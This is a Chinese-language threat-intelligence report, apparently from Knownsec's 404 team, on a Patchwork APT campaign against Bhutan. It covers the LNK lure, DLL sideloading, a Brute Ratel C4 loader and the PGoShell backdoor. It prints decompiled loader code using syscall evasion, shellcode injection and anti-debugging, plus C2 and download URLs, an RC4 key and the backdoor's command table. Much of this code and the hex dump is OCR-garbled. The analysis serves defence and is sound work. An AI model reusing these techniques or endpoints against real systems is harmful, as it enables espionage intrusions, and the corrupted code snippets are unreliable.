@@ -1,0 +1,276 @@
+# Patchwork组织更新武器库，首次利用BruteRatel C4和PGoshell增强版发起攻击  
+
+曲29分钟之前 $\Bumpeq$ 404专栏(/category/404team/)·威胁情报 (/category/threat-intelligence/)  
+
+# 作者：K&XWS@知道创宇404高级威胁情报团队时间：2024年7月15日  
+
+1概述  
+
+近期，知道创宇404高级威胁情报团队捕获到Patchwork组织疑似针对不丹的攻击样本，该样本除加载已多次发现的go语言后门(以下称“PGoShell”)外，还大规模增强了功能。与此同时，样本首次使用了红队工具Brute Ratel(https://bruteratel.com/)C4，即近期观察到的比较大的武器更新。该组织在最近2年的攻击活动中，于技术方面比其他同源组织投入的热情更多，并不断更新自身的武器库及加载方式。迄今为止，已发现该组织使用了超过10种不同的木马及加载方式。以下将对本次发现进行分析和描述。  
+
+# 2组织背景  
+
+Patchwork（又称Dropping Elephant）是一个极为活跃的高级持续性威胁(APT）组织，自2014年以来一直在开展活动。Patchwork主要针对东亚及南亚等亚洲地区的政府、国防和外交组织以及大学，科研机构。  
+
+# 3攻击链  
+
+  
+
+# 4样本综述  
+
+此次捕获的样本为Lnk文件，其主要功能是下载诱饵文件和后续载荷。经过对载荷的分析后发现，此次攻击使用的武器包括PGoShell以及红队攻击框架BruteRatel(https://bruteratel.com/) C4，详情如下:  
+
+## 4.1Ink分析描述  
+
+Ink文件名为Large_Innovation_Project_for_Bhutan.pdf.lnk，当用户未开启文件后缀显示时，极易将其当作pdf文档打开，在lnk运行后，其中包含的脚本参数也得以运行：  
+
+1.操作一：  
+
+访问并下载uri（hxxps://adaptation  
+funds.org/documents/Large_Innovation_Project_for_Bhutan.pdf) 文件至本地 C:\Users\Public\Large_Innovation_Project _for_Bhutan.pdf， 该文件为诱饵文档，下 载完成后运行。  
+
+# PROPOSAL FOR LARGEINNOVATION PROJECT FOR BHUTAN  
+
+## 诱饵文档部分截图  
+
+诱饵文档内容为adaptationfund(适应基金董事会)关于不丹的项目提案，疑似针对不丹相关机构和个人。  
+
+## 2.操作二:  
+
+访问并下载uri（hxxps://beijingtv.org/wpytd52vDw/brtd2389aw）数据至本地C:\Users\Public\hal，并将其重命名为C:\Users\Public\edputil.dll，值得注意的是该域名疑似仿冒北京电视台。  
+
+## 3.操作三：  
+
+访问并下载uri （hxxps:/beijingtv.org/ogQas32xzsy6/fRgt9azswq1e）数据至本地C:\Users\Public\sam， 并将其重命名为C:\Users\Public\Winver.exe。  
+
+4.操作四：  
+
+从系统目录复制resmon.exe到C:\Users\Public\resmon.exe，创建名为MicroUpdate的计划任务，该计划任务每分钟执行一次，执行目标为C:\Users\Public\resmon.exe。创建名为MicroUppdate的计划任务，该计划任务每分钟执行一次，执行目标为C:\Users\Public\Winver.exe，最终删除Ink文件。  
+
+4.2 Brute Ratel (https://bruteratel.com/) C4(edputil.dll)分析   
+4.2.1 Brute Ratel (https://bruteratel.com/) C4 loader分析描述  
+
+resmon.exe为系统文件，运行后会加载edputil.dll。基于windows默认加载原则，与resmon.exe同目录下的edputil.dll将被加载，edputil.dll使用themida加壳：  
+
+  
+
+edputil.dll区段中的.themida段  
+
+<html><body><table><tr><td>Name</td><td>Address</td><td>Ordinal</td></tr><tr><td>D EdpGetIsManaged</td><td>000000021F2425C0</td><td>1</td></tr><tr><td>DllEntryPoint</td><td>000000021F8370B0</td><td>main</td></tr><tr><td></td><td></td><td></td></tr></table></body></html>  
+
+### edputil.dll导出表  
+
+EdpGetlsManaged导出的主要功能既是Brute Ratel (https://bruteratel.com/） C4loader，攻击者首先会利用自定义的hash算法获取api地址：  
+
+$v2=$ (int \*) MEMORY[0x40180];   
+V19 $=$ 0i64;   
+v21[0] $\l=$ 0i64;   
+$v2\theta=$ (int)\*MEMORY[0x40180]; // shellcode length   
+NtProtectVirtualMemory $=$ (_BYTE \*)getaddr_fromhash_13D0(0x82FC6C67， vθ);   
+NtAllocateVirtualMemory_0 $=$ (_BYTE \*)getaddr_fromhash_13D0(-475290686, v1); ZWWaitForSingleobject=(BTE)getaddrfromhash13Do(-483143843,V1)SeUg getaddr_fromhash_13D0(-429631912, $\mathsf{v1}$ ); // NtCreateThreadEx  
+
+### 通过hash获取api地址  
+
+为达到unhook和反调试的目的，攻击者将获取对应函数的系统调用号，然后获取"syscall"指令地址，以NtProtectVirtualMemory函数为例，其中调用号为$"0\mathbf{\times50}^{\prime\prime}$  
+
+  
+
+后续若需要调用NtProtectVirtualMemory，则只需要将调用号（Ox50）传入eax，再调用“syscall”的地址即可完成函数的调用，利用此调用方式，传统的下断点将失效：  
+
+loc_3A8:  
+
+CODE XREF: sub_3A4↑j mov r10,rcx mov rax,r9 jmp [rsp+arg_20]  
+
+  
+
+loc_3BE:  
+
+；CODE XREF: sub_3A0↑j mov r10, rcx mov rax, [rsp+arg_30] jmp [rsp+arg_38]  
+
+loc_3CA:  
+
+; CODE XREF: sub_3A6↑j   
+mov r10, rcx   
+mov rax, [rsp+arg_58]   
+jmp [rsp+arg_60] Seebug  
+
+syscall调用代码片段  
+
+将shellcode写入申请的内存中，更改新分配的内存的保护，通过NtCreateThreadEx创建线程并执行：  
+
+susp_memcpy_157e(v19, MEMORY[ex40170], \*v2);// shellcode   
+susp_memset_15Aθ(MEMORY[x4017e],0,\*v2);   
+sub_3A2(-1i64,(int64)&v19,(int64)&v20, 32i64,(int64)v18,callnum_14c0, int64)syscall_addr_1498);// << NtProtectVirtualMemc LODWORD(v16)=V17;   
+LODWORD(v15)=0;   
+sub_3A6((_int64)v21, 0x1F03FFi64, 0i64,-1i64, v19, 0i64, v15, 0i64,0,0,0, v16, v12);// << NtCreateThreadEx   
+sub_3A4(-1i64，0i64，0i64，v7，(_int64)v10);// <<ZwWaitForSingle0bject  
+
+### Shellcode运行  
+
+Shellcode的主要功能是加载最终载荷（Brute Ratel(https://bruteratel.com/） C4），它首先会进行调试器检测，接着对PEB中的NtGlobalFlag值进行对比，若为Ox70则结束运行：  
+
+V10 $=$ -_readgsqword(0x60u); result $\qquad=\quad*$ (_BYTE \*)(v10 $^+$ 0xBC）& 0x70; if （（_BYTE)result $==$ 0x70) return result;  
+
+### 调试器检测  
+
+### 获取后续需要使用的api地址：  
+
+V88[27] $\Bumpeq$ get_apiaddr_fromhash_3BE15((_int64)v88，-2097386393, i);// NtProtectVirtualMemory LOWORD(v88[30]) $\equiv$ get_syscall_num_3C6C5((char \*)v88[27], 0, 1);// 0x50   
+v88[31] $\Bumpeq$ (_int64)get_syscall_addr_3C2C5((_BYTE \*)v88[27]);   
+V88[29] $=$ get_apiaddr_fromhash_3BE15((_int64)v88, 351328598, v88[0]);// ZwFlushInstructionCache WORD2(v88[30]) $=$ get_syscall_num_3C6C5((char \*)v88[29], 0, 1);// 0xE3   
+v88[33] $\r=$ (int64)get_syscal1_addr_3C2C5((_BYTE \*)v88[29]);   
+V88[20] $=$ get_apiaddr_fromhash_3BE15((_int64)v88, 0xA02A4355, v88[0]);// Rt1FreeHeap   
+V88[23] $=$ get_apiaddr_fromhash_3BE15((_int64)v88, 0xA14B9F41, v88[0]);// LdrGetD1lHandleEx v88[22] $=$ get_apiaddr_fromhash_3BE15((_int64)v88, 1775940843, v88[0]);// LdrGetProcedureAddress v88[19] ${}={}$ get_apiaddr_fromhash_3BE15((int64)v88, -391142911, v88[0]);// RtlExitUserTbeeacUg $\vee84=\theta$  
+
+### 获取api地址  
+
+接下来进行系统时间检测，若当前系统时间超过硬编码的时间戳（0x66c0666d），则结束运行：  
+
+GetSystemTimeAsFileTime $\underline{{\underline{{\mathbf{\Pi}}}}}$ (void (_fastcall \*)(int \*))get_apiaddr_fromhash_3BE15(a1, 1535136116, \*(_QWORD \*)(a1 + 8));   
+\*(_QWORD \*)(a1 + 120) $\Bumpeq$ GetSystemTimeAsFileTime;   
+GetSystemTimeAsFileTime(v7);   
+$\yen5=$ (unsigned int)v7[0] $^+$ ((unsigned int64)(unsigned int)v7[1]<< 32）-0x19DB1DED53E8000i64;   
+return v5 / 0x989680 > a2; 计算时间戳，并与硬编码的时间戳进行比较   
+if (\*v8） result sub_3D7C5(( int64)v88，\*v8); //运行时间不能大于0x66C0666D既是2024-8-1716:59:25 if ( (_DWORD)result return result;  
+
+### 运行时间检测  
+
+使用RC4算法解密出后续需要加载的文件名（chakra.dll），该文件主要作为BruteRatel (https://bruteratel.com/) C4的载体:  
+
+V61 $=$ v88[44];   
+$v62=$ v88[48];   
+V63 $=$ v88[45]- 8;   
+for（ $\mathrm{~\textbf~{~k~}~}=$ 0i64;k != 256; ++k ) \*((_BYTE \*)v89 + k) = k;   
+V65 $=$ (char \*)v89;   
+LOBYTE(v66) $=0$   
+v67 = 0;   
+V68 $\equiv$ V61 $^+$ V63;   
+do   
+{ v69 = v67; $v79=^{*}\lor65;$ ++v67; $^{++}$ V65; v66 $=$ (unsigned int8)(v66 + v70 + \*(_BYTE \*)(v68 + (v69 & 7))); \*(v65 - 1) = \*((_BYTE \*)v89 $^+$ V66); \*((_BYTE \*)v89 + V66) $=$ v70;   
+while （v67 $!=~256$ );   
+sub_3B8E5((_int64)v89，v62,v62，v16); // chakra.dll   
+V15 $\equiv$ (_BYTE \*)v88[39];  
+
+### 解密数据  
+
+chakra.dll被加载后，将去除“MZ"头的最终载荷BruteRatel(https://bruteratel.com/）C4写入chakra.dll的地址空间，并模拟加载Brute Ratel(https://bruteratel.com/) C4:  
+
+Patchwork组织更新武器库，首次利用BruteRatelC4和PGoshell增强版发起攻击  
+
+
+<html><body><table><tr><td>地址</td><td colspan="9"></td></tr><tr><td></td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>ASCII</td></tr><tr><td>00007FFA80030000</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA80030010 00007FFA80030020</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td><td></td></tr><tr><td>00007FFA80030030</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>80</td><td>00</td><td>00</td><td>088</td><td></td></tr><tr><td>00007FFA80030040</td><td>OE 1F</td><td>BA</td><td>OE</td><td>00</td><td>B4</td><td>CD 60</td><td>21</td><td>B8</td><td>01 4C</td><td>CD</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA80030050</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>020002000</td><td>000</td><td>00</td><td></td><td>00</td><td></td></tr><tr><td>00007FFA800300 160</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>000</td><td></td><td>00</td><td></td><td>00</td><td></td></tr><tr><td>00007FFA8003001</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>OD</td><td>OD OA</td><td>24</td><td></td><td></td><td></td><td>00</td><td></td><td>00</td><td></td></tr><tr><td>00007FFA80030080</td><td>50 45</td><td>00</td><td>00</td><td>64</td><td>86</td><td>60</td><td>A80058</td><td>CB</td><td>620008</td><td>00</td><td></td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA8003009 90</td><td>00 00</td><td>00</td><td>00</td><td>FO</td><td>00</td><td>2E</td><td></td><td>221000</td><td></td><td>00</td><td></td><td>03</td><td>00</td><td></td></tr><tr><td>00007FFA800300A0</td><td>00 94</td><td>00</td><td></td><td>00</td><td>BO</td><td>00</td><td></td><td></td><td></td><td>00</td><td>92</td><td>888</td><td>00</td><td></td></tr><tr><td>00007FFA800300B0</td><td>00 00</td><td>00</td><td>68</td><td>00</td><td>00</td><td>00</td><td></td><td></td><td></td><td>00</td><td></td><td></td><td></td><td></td></tr><tr><td>00007FFA800300</td><td>04 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td></td><td></td><td></td><td>00</td><td>00</td><td></td><td>00</td><td></td></tr><tr><td>00007FFA80030</td><td>BO 00</td><td>04</td><td>00</td><td>00</td><td>04</td><td></td><td></td><td>96</td><td></td><td>00 03</td><td>00</td><td></td><td>00</td><td></td></tr><tr><td>00007FFA800300</td><td>00 00</td><td>20</td><td>00</td><td>80</td><td>00</td><td>008</td><td>00</td><td>10</td><td>00</td><td>00 00</td><td>00</td><td>8888</td><td>00</td><td></td></tr><tr><td>00007FFA80030</td><td>00 00</td><td>10</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00000020 00</td><td>10</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA8003</td><td>00 00</td><td>00</td><td>00</td><td>10</td><td>00</td><td>00</td><td>00 00</td><td>80</td><td>04</td><td>00 36</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA8003</td><td>00 06</td><td>04</td><td>00</td><td>14</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA8003</td><td>00 06</td><td>03</td><td>00</td><td>84</td><td>15</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA800 3</td><td>00 AO</td><td>04</td><td>00</td><td>94</td><td>05</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA800</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA800: 3</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td></td><td></td></tr><tr><td>00007FFA8003</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td></td><td></td></tr><tr><td>00007FFA800301</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00 00</td><td>00</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA80030180</td><td>00 00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>00</td><td>2E 74</td><td>65</td><td>78</td><td>74 00</td><td>00</td><td>00</td><td></td></tr><tr><td>00007FFA80030190</td><td>19</td><td>03</td><td>nn</td><td></td><td>10</td><td></td><td></td><td>1</td><td></td><td>nn</td><td>04</td><td></td><td>nn</td><td></td></tr></table></body></html>  
+
+### 去掉" MZ" 的Brute Ratel (https://bruteratel.com/) C4  
+
+### load_d11_3D645(  
+
+//加载chakra.dll  
+
+_int64 \*)(unsigned int)&v23, int64 \*)(unsigned int)&v24, _int64 \*)(unsigned int)&v25, (unsigned int)&v26, a1, v29);   
+memcpy_payload_3D835(v24, $v2$ ，\*(unsigned int \*)( $(\vee4+\theta\times54\$ ));// 写入payload header   
+$\downarrow5=$ (unsigned int \*)( $\vee4+\cdot*$ (unsigned _int16 \*) $(\lor4+2\theta)+24)$ ；   
+if（\*(_WORD \*)( ${\vee}4+6{\:}$ ）   
+{ $v6=v4+*$ (unsigned _int16 \*)( $(14+28)+64.$ v7 = v6 + 40i64 \* ((unsigned int)\*(unsigned _int16 \*)(v4 + 6) - 1); while（1） memcpy_payload_3D835(v24 + v5[3], v2 + v5[5], $v5$ [4]);/／写入各区段 $\downarrow5=$ (unsigned int \*)v6; if（ $v{6}~==~v{7}$ ） break; V6 $+=$ 40i64;  
+
+### 将数据写入chakra.dll内存空间  
+
+获取OEP并跳转执行，最终执行载荷既是BruteRatel（https://bruteratel.com/）C4:  
+
+V8 =\*(OWORD \*)(a1 + 368):   
+v20 =(void (fastcall \*)( int64 \*))(\*(unsigned int \*)(v4 + 0x28) + v24);// Nt Headers + 0x28 v9= v24 +\*(int \*)(v24 + 60); Seebug v20(v29); // >>> OEP  
+
+### 跳转OEP执行  
+
+## 4.2.2 Brute Ratel (https://bruteratel.com/) C4简述  
+
+Brute Ratel(https://bruteratel.com/）C4是一个红队框架，并被视为CobaltStrike的替代品。该框架能够实现诸如文件管理、端口扫描、文件上传下载、屏幕截图等功能，以下为本次该载荷的配置截图，各项配置间使用"”进行分隔：  
+
+<html><body><table><tr><td>九元4FF864772元8622042063元1356170569265262E669877487</td><td>C23446443460304618F66063672007006617026F61228847</td><td>3788878679764656965215465151556765613286154193737</td><td>1127151622498541612122043612598357724173244768870650584222</td><td>349465716279997635312765125657870125641676538716313128477346 E</td><td>OE</td><td>7c 18401869665456614302141373323161581561692512442542106123015607</td><td>m</td><td>354227615354179447428817020830246172625164156431566573877</td><td>1837479427472061286232846546127082866E8232</td><td></td><td>1141473354437613976518630646573683626013414963070131504</td><td>1306945196471696617166974829242139426132665252666115547442442295</td><td>304136418656740466554420301042574651701615156166435872477</td><td>19A54199427941216656210132081135821546556552426827465</td><td>113590841304302474841886710437232477443316724</td><td>23354</td><td>4472</td><td>0|90|45|100|1] 11iImh0dHA6Ly93 d3cudzMub3JnLzE5 oTkveGhobwwi|ey] odHRwOi8vd3d3LmJ haWR1LmNuL3N1YXJ jaCIiInO=|eyJTdw JtaXRoZWQioiJPay</td></tr></table></body></html>  
+
+## 4.3 PGoShell（Winver.exe）分析  
+
+PGoShell由Go语言开发，总体来看其功能较丰富，包括远程shell、屏幕截图，载荷下载执行等，由于首次发现该武器时主要功能为远程shell故而得名。相关详细逆向分析内容如下：  
+
+初始化URl、RC4密钥，User-Agent,本次样本中RC4密钥内容为'0g8RXt137ODBeqPhTv2XYjgmnxUsijfc"。  
+
+URL_960AE0 $=$ (_int64)"https://cartmizer.info/lkqnzntawldqjlwdxivsnemw";//   
+qword_960AF8 $=$ 32LL;   
+if （ dword_9B5610）   
+{ $v5=$ runtime_gcWriteBarrier1(RC4_key_960AF0); \*v6 = v5;   
+RC4_key_960AF0 $=$ (__int64)"0g8RXt1370DBeqPhTv2XYjgmnxUsijfc";// RC4 key   
+qword_960B08 $=$ 28LL;   
+if （ dword_9B5610）   
+{ $v7=$ runtime_gcWriteBarrier1(UA_960B00); \*v8 = v7;   
+了   
+UA_960B00 $=$ （__int64)"QllXjxbyEvMuARVOztDiSZDNtQQb";// UA   
+qword_960708 $=13\mathsf{L L}$  
+
+初始化URI、RC4密钥  
+
+检测HKCU\Software\Microsoft\WinTemp是否存在，若存在则获取temp键对应的值；若不存在则生成随机字符串，并使用 $\mathsf{R C4+}$ base64加密后写入，该值将作为ID被上传到服务端：  
+
+New $=$ main_CreateNew(9Ll,a2,a3, a4，a5);   
+$v7=$ golang_org_x_sys_windows_registry_OpenKey(0x80000001LL, "Software\\Microsoft\\WinTemp", 26LL, 131103LL);   
+if（"Software\\Microsoft\\WinTemp") v58 $=$ qword_9214E8; if（"Software\\Microsoft\\WinTemp"==（char\*)off_794540) { Key = v7; if ( (unsigned _int8)runtime_ifaceeq("Software\\Microsoft\WinTemp", v8, &v58) ) { Key $=$ golang_org_x_sys_windows_registry_CreateKey(2147483649LL, "Software\\Microsoft\\WinTemp", 26LL, 131103LL); v9 $=$ RC4_key_960AF0; v68 $=$ runtime_stringtoslicebyte(v65，RC4_key_960AF0，qword_960AF8); v56 $=$ v9; v54 $=$ v10; V11 $\Bumpeq$ New; V12 $\Bumpeq$ (uint8 \*)runtime_stringtoslicebyte(v64,New，a2); v17 $\Bumpeq$ main_AESENC(v68,v56, v54,v12, v11,v13,v14, v15,v16); V18 ${}={}$ runtime_slicebytetostring(v63,v17,v56); golang_org_x_sys_windows_registry_Key_setStringValue(Key, "temp", 4LL, 1Ll, v18, v17); 7 = Key;  
+
+进入信息收集&交互模块后，PGoShell首先会尝试获取主机信息(主机名、用户名、当前主机对公IP、当前主机所处国家(IP及国家信息由查询ip-api.com获取)、当前系统版本、当前执行路径、进程PID、PROCESSOR_ARCHITECTURE信息)，获取成功后将对应的数据进行拼接，各信息数据使用“ll”进行分隔。  
+
+main_MainStructInitialization2(v67，（__int64)v53);// 获取主机信息   
+while（1）   
+{ $\vee27=$ runtime_concatstring3(0Ll, &unk_790FF0, 1LL, ，2LL，v67，v53); $\vee28=$ runtime_concatstring3(0LL, $v27$ ，&unk_790FF0, "|l"，2Ll,qword_961120,qword_961128); $v29=v27$ $v30~=~\lor28$ $\vee31=$ runtime_concatstring3(0Ll, v28, v29, "ll", 2Ll, qword_9610c0, qword_9610c8); $\vee32=$ v30; $\vee33~=~\vee31.$ $\vee34=$ runtime_concatstring3(0LL, v31, v32, "ll", 2Ll, qword_9610D0, qword_9610D8); $\vee35=$ V33; $\lor36=\lor34.$ $\vee37=$ runtime_concatstring3(0Ll, v34, $v35$ ，"ll"，2Ll,qword_9610E0, qword_9610E8); $\vee38=$ V36; $\vee39~=~\vee37$ $\vee4\emptyset=$ runtime_concatstring3(0Ll, v37, v38, "ll", 2Ll, qword_961110, qword_961118); $\vee41=$ V39; $\downarrow42=\lor48$ $\vee43=$ runtime_concatstring3(0Ll, v40, v41, "ll", 2Ll, qword_961100, qword_961108); $\lor44=\lor42$ $\vee45~=~\vee43$ $\vee46=$ runtime_concatstring3(0LL, $v43$ ， $\cup44$ ，"ll"， 2Ll，qword_9610F0,qword_9610F8); $\vee47=\vee45$ $\vee48~=~\vee46$ $\vee49=$ (uint8 \*)runtime_stringtoslicebyte(0Ll, v46, v47);  
+
+### 获取主机信息并拼接  
+
+PGoShell获取到的所有数据均使用RC4+base64进行编码（截图中main_AESENC为攻击者迷惑分析人员编写的函数名，其内在实际为 $\mathsf{R C4+}$ base64):  
+
+$\downarrow4=$ os_user_Current(a1); // user   
+if（a2）   
+{ v5 = RC4_key_960AF0; $v6=$ runtime_stringtoslicebyte(v213, RC4_key_960AF0, qword_960AF8); qmemcpy(v189, "unknown", sizeof(v189)); $\vee7=$ v189; LODWORD( $\mathrm{\boldmath~v}8)=7.$ V13 $\equiv$ main_AESENC(v6, $v5$ ，v9，(uint8 \*)v189,7uLL,7uLL,v10,v11，v12); $\vee14~=~\vee5$ $\vee15=$ (_int64)v13; V16 $=$ runtime_slicebytetostring(0LL, v13, v14); qword_9610c8 = v15; if （ dword_9B5610） V16 $=$ runtime_gcWriteBarrier2(v16); $^{*}\vee21=\vee16.$ $\vee17=$ username_9610c0; V21[1] $=$ username_9610c0; } username_9610c0 $=$ v16;   
+}  
+
+### RC4Key及其解密数据  
+
+随后将拼接的数据发送到服务端，并从服务端获取数据，上线信息以及交互信息上传方式均采用POST方式。  
+
+PGoShel部分功能如下表：  
+
+
+<html><body><table><tr><td>功能号</td><td>功能</td></tr><tr><td>c?d????????e</td><td>shell</td></tr><tr><td>vypjtvwudmta</td><td>文件下载</td></tr><tr><td>zdqxjiueled</td><td>下载执行</td></tr><tr><td>mldijkppffollpps</td><td>下载执行</td></tr><tr><td>s?p????????t</td><td>屏幕截图</td></tr><tr><td>ssaphdnu</td><td>下载powershellbypass脚本并运行</td></tr><tr><td>tcvbwmdddqls</td><td>检查文件是否存在，存在则上传</td></tr><tr><td>egdhdnipjhfn</td><td>从指定url下载shellcode并注入</td></tr><tr><td>jhudjphsmunee</td><td>利用WMI枚举设备信息</td></tr><tr><td>getmdjfhhkjhsdfdc</td><td>获取域控信息</td></tr></table></body></html>  
+
+<html><body><table><tr><td>功能号</td><td>功能</td></tr><tr><td>nemszyrsmuns</td><td>下载Solo.zip到temp目录，解压后执行其中的powershell脚 本</td></tr><tr><td>nfjdnteslbt</td><td>下载shellcode并通过QueueUserAPC注入执行</td></tr><tr><td>ndhbnmesnefdmu</td><td>SMB端口扫描</td></tr><tr><td>rdptidjkeephdnmak</td><td>RDP端口扫描</td></tr></table></body></html>  
+
+# 5总结  
+
+本次捕获的攻击活动主要以adaptationfund(适应基金董事会)关于不丹的项目提案作为诱饵，针对对象疑似为不丹相关机构和个人。在此次攻击活动中，首次发现Patchwork组织使用BruteRatel（https://bruteratel.com/）C4作为武器。整个BruteRatel(https://bruteratel.com/）C4加载运行过程为纯内存加载，能够有效对抗终端设备检测。在加载过程中，多次进行反调试和解除挂钩操作，并在执行周期上进行了限制。这表明该组织正在积极扩充其武器库。根据网络信息，BruteRatel  
+
+(https://bruteratel.com/）C4的作者来自于印度：  
+
+BruteRatelC4于2020年12月作为渗透测试工具首次亮相。当时，它的开发是由居住在印度的一位名叫Chetan Nayak（又名偏执忍者）的安全工程师兼职完成的。根据他的网站（DarkVortex），Nayak在西方网络安全供应商的高级红队职位上积累了多年的经验。在过去的2.5年里，Nayak在特性、功能、支持和培训方面对渗透测试工具进行了渐进式改进。  
+
+BRc4目前标榜自己是"用于红队和对手模拟的定制指挥和控制中心"。5月16日，Nayak宣布该工具已获得350名客户的480名用户。  
+
+  
+
+ParanoidNinja(BruteRatel C4) @NinjaParanoid  
+
+Extremely happy to announce that Brute Ratel has crossed350customersandaround $^{480+}$ licenseslast week. #BRc4 started off as a fun project 2 years back, before I decided to make it commercial. I had my doubts when I started, since BRc4 was very basic back then andhad (1/3)  
+
+目前该工具的价格为US\$3000，patchwork组织在购买该工具的时候或许可以获得一定折扣。  
+
+  
+
+此外，我们注意到本次使用的PGoShel在功能上进行了极大的扩展，与以往发现的攻击样本相比更加先进。而PGoShell作为该组织自研的后门工具实施了大规模的功能更新，可见该武器对于patchwork组织的重要程度。我们有理由相信，PGoShell在以往的攻击活动中帮助Patchwork取得了显著成果，未来，该组织可能会更多地使用这一武器发起攻击。  
+
+# 610C  
+
+C2:  
+
+Beijingtv[.]org  
+
+Cartmizer[.]info  
+
+longwang.b-cdn[.]net  
+
+7参考链接  
+
+https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/ (https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)  
